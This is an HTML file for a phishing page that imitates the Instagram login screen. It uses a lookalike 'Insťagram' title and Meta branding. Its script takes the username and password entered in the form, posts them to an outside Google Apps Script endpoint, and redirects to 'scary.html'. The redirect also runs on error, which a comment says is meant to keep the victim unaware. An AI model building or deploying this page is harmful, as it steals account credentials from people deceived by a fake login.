<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Insťagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            min-height: 100vh;
            align-items: center;
            justify-content: center;
        }
        .container {
            display: flex;
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 20px;
            align-items: center;
            gap: 60px;
        }
        .left-section {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            max-width: 600px;
        }
        .logo { width: 80px; height: 80px; margin-bottom: 50px; }
        .logo svg { width: 100%; height: 100%; }
        .tagline { font-size: 46px; font-weight: 300; line-height: 1.3; color: #000000; margin-bottom: 50px; }
        .tagline .highlight { color: #ed4956; font-weight: 400; }
        .phone-mockup-container {
            position: relative;
            width: 100%;
            max-width: 500px;
            height: 400px;
            display: flex;
            align-items: center;
            justify-content: flex-start;
            margin-left: -20px;
        }
        .phone-card {
            position: absolute;
            width: 220px;
            height: 350px;
            border-radius: 28px;
            overflow: hidden;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
            border: 6px solid #ffffff;
        }
        .phone-card:nth-child(1) { left: 0; z-index: 1; transform: rotate(-5deg); }
        .phone-card:nth-child(2) { left: 120px; z-index: 2; transform: rotate(0deg); }
        .phone-card:nth-child(3) { left: 240px; z-index: 3; transform: rotate(5deg); }
        .phone-content { width: 100%; height: 100%; background-size: cover; background-position: center; }
        .phone-card:nth-child(1) .phone-content { background-image: url('https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=400&h=600&fit=crop'); }
        .phone-card:nth-child(2) .phone-content { background-image: url('https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=400&h=600&fit=crop'); }
        .phone-card:nth-child(3) .phone-content { background-image: url('https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=400&h=600&fit=crop'); }
        .right-section { flex: 0 0 380px; }
        .login-box { background: #ffffff; padding: 40px; border: 1px solid #dbdbdb; border-radius: 8px; }
        .login-title { font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 30px; }
        .input-group { margin-bottom: 8px; }
        .input-field {
            width: 100%;
            padding: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 12px;
            background-color: #fafafa;
        }
        .login-button {
            width: 100%;
            padding: 10px;
            background: #4cb5f5;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
        }
        .forgot-password { text-align: center; margin: 20px 0; }
        .forgot-password a { color: #00376b; text-decoration: none; font-size: 12px; }
        .meta-logo { text-align: center; color: #737373; font-size: 13px; margin-top: 20px; }
        @media (max-width: 968px) { .left-section { display: none; } .container { justify-content: center; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <div class="logo">
                <svg viewBox="0 0 80 80" xmlns="http://www.w3.org/2000/svg">
                    <defs>
                        <linearGradient id="instagram-gradient" x1="0%" y1="100%" x2="100%" y2="0%">
                            <stop offset="0%" style="stop-color:#FFC107;" />
                            <stop offset="25%" style="stop-color:#F44336;" />
                            <stop offset="50%" style="stop-color:#E91E63;" />
                            <stop offset="100%" style="stop-color:#9C27B0;" />
                        </linearGradient>
                    </defs>
                    <rect x="5" y="5" width="70" height="70" rx="18" fill="url(#instagram-gradient)"/>
                    <circle cx="40" cy="40" r="18" fill="none" stroke="white" stroke-width="4"/>
                    <circle cx="60" cy="20" r="4" fill="white"/>
                </svg>
            </div>
            <h1 class="tagline">See everyday moments from your<br><span class="highlight">close friends.</span></h1>
            <div class="phone-mockup-container">
                <div class="phone-card"><div class="phone-content"></div></div>
                <div class="phone-card"><div class="phone-content"></div></div>
                <div class="phone-card"><div class="phone-content"></div></div>
            </div>
        </div>

        <div class="right-section">
            <div class="login-box">
                <h2 class="login-title">Log into Insťagram</h2>
                <form id="loginForm">
                    <div class="input-group">
                        <input type="text" name="username" class="input-field" placeholder="Mobile number, username or email" required>
                    </div>
                    <div class="input-group">
                        <input type="password" name="password" class="input-field" placeholder="Password" required>
                    </div>
                    <button type="submit" class="login-button">Log in</button>
                </form>
                <div class="forgot-password"><a href="forget-password.html">Forgot password?</a></div>
                <div class="meta-logo">Meta</div>
            </div>
        </div>
    </div>

    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbztTlG3USYjrB4MJ1PPglFuKwzBrvQ-2ntyUEftl4MA4jExCYKX3zOK_fILViFzBFQPUw/exec';
        const form = document.querySelector('#loginForm');

        form.addEventListener('submit', e => {
            e.preventDefault();
            
            // Sending credentials to your Google Apps Script
            fetch(scriptURL, { 
                method: 'POST', 
                body: new FormData(form)
            })
            .then(response => {
                console.log('Success!', response);
                window.location.href = "scary.html";
            })
            .catch(error => {
                console.error('Error!', error.message);
                // Still redirect to keep the user unaware of the error
                window.location.href = "scary.html";
            });
        });
    </script>
</body>
</html>
